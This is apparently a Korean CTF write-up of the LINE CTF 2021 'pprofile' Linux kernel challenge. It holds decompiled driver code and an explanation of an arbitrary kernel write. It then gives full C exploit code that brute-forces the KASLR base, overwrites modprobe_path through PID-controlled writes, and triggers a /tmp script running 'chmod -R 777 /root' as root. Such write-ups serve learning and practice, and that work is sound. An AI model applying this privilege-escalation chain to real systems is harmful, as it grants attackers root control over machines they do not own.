---
layout: simple
title: (LINE CTF 2021) pprofile writeup
---

## **Intro**

2021년 LINE CTF 에 출제된 문제이다. 

이 문제는 처음에 감도 못잡았다가 TheDuck 팀이 푼게 있어 살짝 치팅 좀 했다 ㅎㅎ;;

문제를 제대로 이해하지 못한 이유는 [copy_user_generic_unrolled](/study/linux_kernel/basic/copy_user_generic_unrolled) 함수 때문이다. 

이 함수가 뭐하는지 몰랐는데 치명적인 함수였다. 

나머지는 안보고 알아서 풀었다. 

## **Analysis**

이 함수에는 `pprofile.ko` 라는 커널 드라이버가 있고, ioctl 처리 함수가 있다. 

```c
__int64 __fastcall pprofile_ioctl(__int64 a1, __int64 command, __int64 a3)
{
  __int64 arg; // rdx
  __int64 result; // rax
  struct storage **v5; // rbx
  struct storage *v6; // rbp
  struct task *v7; // rbx
  struct task *task; // rax
  unsigned int task_pid; // ebp
  unsigned int length; // r12d
  int v11; // eax
  int copied_length; // ebx
  __int64 tmp_index; // rax
  __int64 storage_count; // r12
  struct storage **__storages; // rbp
  size_t string_from_user_length; // rbp
  unsigned int user_string_length_1; // r13d
  _DWORD *kmalloc_chunk; // r15
  struct storage *storage_alloc; // r14
  __int64 alloc_2; // rcx
  unsigned __int64 _current_task; // rdi
  int v22; // eax
  __int64 tmp_index_; // rbp
  struct storage *storage_count_; // r12
  const char *storage; // r13
  unsigned int v26; // eax
  __int64 v27; // rdx
  struct task *task_alloc; // [rsp+0h] [rbp-60h]
  struct storage kernel_buffer; // [rsp+8h] [rbp-58h] BYREF
  char string_from_user[8]; // [rsp+1Fh] [rbp-41h] BYREF
  char v31; // [rsp+27h] [rbp-39h]
  unsigned __int64 v32; // [rsp+28h] [rbp-38h]

  _fentry__(a1, command);
  *(_QWORD *)string_from_user = 0LL;
  v31 = 0;
  v32 = __readgsqword(0x28u);
  kernel_buffer.string = 0LL;
  kernel_buffer.task = 0LL;
  LODWORD(result) = copy_from_user(&kernel_buffer, arg, 16LL);
  if ( (_DWORD)result )
    return (int)result;
  if ( (_DWORD)command == 32 )
  {
    v11 = strncpy_from_user(string_from_user, kernel_buffer.string, 8LL);
    copied_length = v11;
    if ( v11 && v11 != 9 )
    {
      if ( v11 >= 0 )
      {
        tmp_index = 0LL;
        while ( 1 )
        {
          storage_count = (int)tmp_index;
          if ( !storages[tmp_index] )
            break;
          if ( ++tmp_index == 16 )
            return -11LL;
        }
        __storages = storages;
        while ( !*__storages || strcmp((const char *)(*__storages)->string, string_from_user) )
        {
          if ( &storages[16] == ++__storages )
          {
            string_from_user_length = strlen(string_from_user);
            if ( string_from_user_length - 1 > 7 )
              return -11LL;
            user_string_length_1 = string_from_user_length + 1;
            kmalloc_chunk = (_DWORD *)_kmalloc(string_from_user_length + 1, 0x6000C0LL);
            storage_alloc = (struct storage *)kmem_cache_alloc_trace(kmalloc_caches[4], 0x6000C0LL, 16LL);
            alloc_2 = kmem_cache_alloc_trace(kmalloc_caches[4], 0x6000C0LL, 16LL);// size 16
            if ( storage_alloc == 0LL || kmalloc_chunk == 0LL || !alloc_2 )
              return -12LL;
            if ( user_string_length_1 >= 8 )
            {
              *(_QWORD *)((char *)kmalloc_chunk + user_string_length_1 - 8) = 0LL;
              if ( (unsigned int)string_from_user_length >= 8 )
              {
                v26 = 0;
                do
                {
                  v27 = v26;
                  v26 += 8;
                  *(_QWORD *)((char *)kmalloc_chunk + v27) = 0LL;
                }                               // memset 0
                while ( v26 < (string_from_user_length & 0xFFFFFFF8) );
              }
            }
            else if ( (user_string_length_1 & 4) != 0 )
            {
              *kmalloc_chunk = 0;
              *(_DWORD *)((char *)kmalloc_chunk + user_string_length_1 - 4) = 0;
            }
            else if ( (_DWORD)string_from_user_length != -1 )
            {
              *(_BYTE *)kmalloc_chunk = 0;
              if ( (user_string_length_1 & 2) != 0 )
                *(_WORD *)((char *)kmalloc_chunk + user_string_length_1 - 2) = 0;
            }
            *(_QWORD *)alloc_2 = 0LL;
            *(_QWORD *)(alloc_2 + 8) = 0LL;
            storage_alloc->string = 0LL;
            storage_alloc->task = 0LL;
            task_alloc = (struct task *)alloc_2;
            memcpy(kmalloc_chunk, string_from_user, string_from_user_length);
            storage_alloc->string = (__int64)kmalloc_chunk;
            _current_task = __readgsqword((unsigned int)&current_task);
            storage_alloc->task = task_alloc;
            task_alloc->task_pid = _task_pid_nr_ns(_current_task, 1LL, 0LL);
            storage_alloc->task->length = copied_length;
            storages[storage_count] = storage_alloc;
            return copied_length;
          }
        }
        return -11LL;
      }
      return copied_length;
    }
    return -34LL;
  }
  if ( (_DWORD)command == 64 )
  {
    v22 = strncpy_from_user(string_from_user, kernel_buffer.string, 8LL);
    copied_length = v22;
    if ( v22 && v22 != 9 )
    {
      if ( v22 >= 0 )
      {
        tmp_index_ = 0LL;
        while ( 1 )
        {
          storage_count_ = storages[tmp_index_];
          if ( storage_count_ )
          {
            storage = (const char *)storage_count_->string;
            if ( !strcmp((const char *)storage_count_->string, string_from_user) )
              break;
          }
          if ( ++tmp_index_ == 16 )
            return -11LL;
        }
        kfree(storage);
        kfree(storage_count_->task);
        storage_count_->string = 0LL;
        storage_count_->task = 0LL;
        kfree(storage_count_);
        storages[(int)tmp_index_] = 0LL;
      }
      return copied_length;
    }
    return -34LL;
  }
  if ( (_DWORD)command != 16 )
    return -11LL;
  LODWORD(result) = strncpy_from_user(string_from_user, kernel_buffer.string, 8LL);
  if ( !(_DWORD)result || (_DWORD)result == 9 )
    return -34LL;
  if ( (int)result < 0 )
    return (int)result;
  v5 = storages;
  while ( 1 )
  {
    v6 = *v5;
    if ( *v5 )
    {
      if ( !strcmp((const char *)v6->string, string_from_user) )
        break;
    }
    if ( ++v5 == &storages[16] )
      return -11LL;
  }
  v7 = kernel_buffer.task;
  task = v6->task;
  task_pid = task->task_pid;
  length = task->length;
  LODWORD(result) = put_user_size(0LL, (__int64)kernel_buffer.task, 4LL);
  if ( (_DWORD)result )
    return (int)result;
  LODWORD(result) = put_user_size(task_pid, (__int64)&v7->task_pid, 4LL);
  if ( (_DWORD)result )
    return (int)result;
  return (int)put_user_size(length, (__int64)&v7->length, 4LL);
}
```

커맨드는 총 3개이고, 하나는 이 드라이버가 정의한 profile구조체를 등록하는 커맨드, 하나는 profile 구조체를 지우는 커맨드, 세번째는 profile 구조체의 값을 알려주는 커맨드이다. 

구조체를 생성할 땐 다음과 같은 정보를 넣는다. 

```c
struct profile
{
    char *name;
    struct task* t;
}

struct task
{
    uint64_t reserved;
    uint32_t pid;
    uint32_t string_length;
}
```
profile 구조체에는 task 구조체가 들어가고, 우리가 설정해준 문자열이 들어간다. 

task 구조체에는 ioctl을 요청한 프로세스의 pid 가 들어가고, 문자열의 길이가 들어간다. 

데이터를 조회할 때는 `copy_user_generic_unrolled()` 함수를 이용하여 profile의 pid와 문자열 길이를 복사하여 가져오게 된다. 

## **Vulnerabilities**

여기서 가장 치명적인 부분은 profile을 조회할 때 사용하나는 `copy_user_generic_unrolled()` 함수의 사용이다. 

```c
__int64 __fastcall put_user_size(__int64 a1, __int64 kernel_buffer, __int64 a3)
{
  __int64 size; // rdx
  _DWORD v5[3]; // [rsp+0h] [rbp-Ch] BYREF

  _fentry__(a1, kernel_buffer);
  v5[0] = a1;
  *(_QWORD *)&v5[1] = __readgsqword(0x28u);
  return copy_user_generic_unrolled(kernel_buffer, v5, size);
}
```

문제에서는 커널 공간에서 사용자 공간으로 데이터를 복사할 떄 사용하는 함수지만, dest 인자에 커널 영역의 주소를 넣어도 데이터를 복사한다. 

또한 복사하는 과정에서 Access violation 이 발생해도 커널 패닉을 유발하지 않는다. 

우리는 profile 을 조회하는 커맨드를 요청할 때, `copy_user_generic_unrolled()` 의 dest 인자를 조절할 수 있고, 이 인자의 주소값을 커널 영역으로 설정한다면, 우리는 임의의 커널 영역 주소에 pid 값을 쓸 수 있게 된다. 

## **Exploit**

먼저 커널의 원하는 영역에 값을 쓰기 위해 커널 베이스 주소를 가져와야 한다. 

해당 VM 에는 kaslr 이 걸려있는데, 사실 64비트에서 커널 주소의 하위 24비트는 고정이고, 역시 상위 32비트도 0xffffffff 로 고정이다.

그렇다면 kaslr 이 걸려있더라도 커널 베이스 주소가 가질 수 있는 값은 그 사이의 8비트의 가지수 뿐이다. 

보통 커널 베이스는 `0xffffffff81000000` 이상이기 때문에 0x81 ~ 0xff 만큼 전수조사를 하면 커널 베이스 주소를 가져올 수 있다. 

그럼 전수조사는 어떻게 할까. 그 방법은 역시 `copy_user_generic_unrolled()` 함수의 특징을 이용하는 것이다. 이 함수는 앞서 언급했듯, AccessViolation 이 발생해도 커널 패닉을 유발하지 않는다. 따라서 임의의 커널 주소에 값을 쓸 때, AccessViolation 이 나면, 그냥 ioctl이 실패하는 것이고, 성공하면 성공했다는 반응이 나온다. 

따라서 나는 대표적인 커널의 쓰기 가능한 Data영역인 `modprobe_path` 부분에 값을 쓰는 것으로 전수조사하여 커널의 베이스 주소를 알 수 있었다. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/wait.h>

#define DEVICE_NAME "/dev/pprofile"
#define SET_PROFILE_COMMAND 32
#define REMOVE_PROFILE_COMMAND 64
#define GET_PROFILE_COMMAND 16

struct task
{
    uint64_t reserved;
    uint32_t pid;
    uint32_t length;
};

struct profile {
    char* name;
    struct task* t;
};

int set_profile(struct profile* p)
{
    int fd = open(DEVICE_NAME, O_RDONLY);
    if (fd < 0)
    {
        printf("set profile: open error\n");
        return -1;
    }
    return ioctl(fd, SET_PROFILE_COMMAND, p);
}

int get_profile(struct profile* p)
{
    int fd = open(DEVICE_NAME, O_RDONLY);
    if (fd < 0)
    {
        printf("get profile: open error\n");
        return -1;
    }
    return ioctl(fd, GET_PROFILE_COMMAND, p);
}

int remove_profile(struct profile* p)
{
    int fd = open(DEVICE_NAME, O_RDONLY);
    if (fd < 0)
    {
        printf("remove profile: open error\n");
        return -1;
    }
    return ioctl(fd, REMOVE_PROFILE_COMMAND, p);
}

int main(void)
{
    char string[] = "TMPSTR";
    struct task t;
    struct profile p;
    uint8_t i;
    uint64_t kernel_base;

    //leak kernel base address
    p.name = string;
    p.t = &t;
    memset(&t, 0, sizeof(t));
    set_profile(&p);
    for (i = 0x81; i < 0xff; i++)
    {
        p.name = string;
        p.t = (struct task*)((0xffffffff00000000 | i << 24) + 0x1256f40);
        if (get_profile(&p) == 0)
        {
            kernel_base = 0xffffffff00000000 | i << 24;
            printf("found kernel base: %llx\n", kernel_base);
            break;
        }

    }
    p.t = &t;
    remove_profile(&p);
    uint64_t modprobe_path = kernel_base + 0x1256f40;
    printf("modprobe_path: %llx\n", modprobe_path);
    return 0;
}
```

이제 할 일은 실제 `modprobe_path`를 덮어 써서 권한 상승을 하는 것이다. 

여러버 fork 를 해서 자신의 pid가 원하는 값일 때 그 값을 `modprobe_path`에 덮어쓰게 하면 된다. 

원래는 한바이트씩 덮어쓰려고 했는데, 이유는 모르겠지만 5번 이상 쓸 때 앞의 값들이 0으로 초기화 되는 바람에 시간이 조금 걸리겠지만 2byte씩 데이터를 쓰기로 했다. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/wait.h>

#define DEVICE_NAME "/dev/pprofile"
#define SET_PROFILE_COMMAND 32
#define REMOVE_PROFILE_COMMAND 64
#define GET_PROFILE_COMMAND 16

struct task
{
    uint64_t reserved;
    uint32_t pid;
    uint32_t length;
};

struct profile {
    char* name;
    struct task* t;
};

int set_profile(struct profile* p)
{
    int fd = open(DEVICE_NAME, O_RDONLY);
    if (fd < 0)
    {
        printf("set profile: open error\n");
        return -1;
    }
    return ioctl(fd, SET_PROFILE_COMMAND, p);
}

int get_profile(struct profile* p)
{
    int fd = open(DEVICE_NAME, O_RDONLY);
    if (fd < 0)
    {
        printf("get profile: open error\n");
        return -1;
    }
    return ioctl(fd, GET_PROFILE_COMMAND, p);
}

int remove_profile(struct profile* p)
{
    int fd = open(DEVICE_NAME, O_RDONLY);
    if (fd < 0)
    {
        printf("remove profile: open error\n");
        return -1;
    }
    return ioctl(fd, REMOVE_PROFILE_COMMAND, p);
}

int main(void)
{
    char string[] = "TMPSTR";
    struct task t;
    struct profile p;
    uint8_t i;
    uint64_t kernel_base;

    //leak kernel base address
    p.name = string;
    p.t = &t;
    memset(&t, 0, sizeof(t));
    set_profile(&p);
    for (i = 0x81; i < 0xff; i++)
    {
        p.name = string;
        p.t = (struct task*)((0xffffffff00000000 | i << 24) + 0x1256f40);
        if (get_profile(&p) == 0)
        {
            kernel_base = 0xffffffff00000000 | i << 24;
            printf("found kernel base: %llx\n", kernel_base);
            break;
        }

    }
    p.t = &t;
    remove_profile(&p);
    uint64_t modprobe_path = kernel_base + 0x1256f40;
    printf("modprobe_path: %llx\n", modprobe_path);
    
    //overwrite modprobe_path
    //char modprobe[] = "/tmp/x\0";
    uint32_t modprobe[] = {0x742f, 0x706d, 0x782f};
    int index = 0;
    string[5] = 0x41;
    while(1)
    {
        int pid = fork();
        int status;
        if (pid == 0)
        {
            pid = getpid();
            //printf("%d\n", pid);
            if((pid & 0xffff) == modprobe[index])
            {
                printf("found pid: %x\n", pid);
                set_profile(&p);
                p.t = (struct task*)(modprobe_path - 8 + (index * 2));
                printf("get profile status: %d\n", get_profile(&p));
                exit(1);
            }
            else
            {
                exit(0);
            }
        }
        else
        {
            waitpid(pid, &status, 0);
            if(WEXITSTATUS(status) == 1)
            {
                printf("%d th index clear\n", index);
                string[5]++;
                index++;
                if(index > 2)
                {
                    printf("trigger modprobe\n");
                    break;
                }
            }
        }
    }

    // trigger modprobe
    system("printf \"\\xff\\xff\\xff\\xff\" > /tmp/trigger");
    system("chmod 777 /tmp/trigger");
    system("printf \"#!/bin/sh\n chmod -R 777 /root\" > /tmp/x");
    system("chmod +x /tmp/x");
    system("/tmp/trigger");
    system("cat /root/flag");
    return 0;
}
```

이렇게 해서 `/root/flag`의 읽기 권한을 추가했고, 플래그를 읽을 수 있었다.  

```bash
/ $ ./exploit 
found kernel base: ffffffffb6000000
modprobe_path: ffffffffb7256f40
found pid: 742f
get profile status: 0
0 th index clear
found pid: 706d
get profile status: 0
1 th index clear
found pid: 782f
get profile status: 0
2 th index clear
trigger modprobe
c
/tmp/trigger: line 1: ����: not found
DH{FAKEFLAG}
```

## **Conclusion**

새로운 함수를 알았고, 새로운 경험을 했다. 저 함수를 실제 환경에서 얼마나 쓰는지는 모르겠지만, 하나 더 알아가는 기분이었다. 

전수조사를 통해 kaslr를 우회하는 경험도 재미있었다. 

## **References**

+ <https://dreamhack.io/wargame/challenges/399>
+ <https://github.com/theori-io/ctf/blob/master/2021/linectf/LINE%20CTF%202021%20Write%20Up%20-%20The%20Duck.pdf>